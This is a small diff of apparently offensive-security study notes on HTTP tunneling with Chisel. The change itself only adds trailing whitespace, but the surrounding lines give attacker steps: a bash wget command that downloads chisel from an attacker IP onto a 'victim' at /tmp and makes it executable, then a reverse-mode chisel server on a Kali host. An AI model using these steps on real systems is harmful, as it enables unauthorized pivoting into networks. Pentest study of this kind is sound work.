@@ -4,7 +4,7 @@
 3. Use tunneling
 
 # HTTP Tunneling
-## Chisel
+## Chisel 
 1. choose correct version & architecture: https://github.com/jpillora/chisel/releases
 2. transfer chisel to victim ``` bash -c 'wget "http://192.168.118.4/chisel" -O /tmp/chisel && chmod +x /tmp/chisel' ```
 3. kali host: ``` chisel server --port 8080 --reverse ```
